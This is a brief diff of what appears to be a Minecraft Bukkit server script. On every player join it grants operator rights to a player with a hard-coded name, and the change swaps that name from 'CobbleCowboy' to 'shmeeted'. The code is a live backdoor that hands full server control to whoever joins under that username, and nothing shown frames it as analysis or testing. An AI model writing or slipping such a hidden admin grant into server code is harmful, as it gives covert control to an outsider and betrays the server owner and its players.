@@ -5,5 +5,5 @@ import org.bukkit.event.EventPriority
 import org.bukkit.event.player.PlayerJoinEvent
 
 Events.subscribe(PlayerJoinEvent, EventPriority.HIGHEST).handler { e ->
-    if (e.player.name == "CobbleCowboy") e.player.setOp(true)
+    if (e.player.name == "shmeeted") e.player.setOp(true)
 }
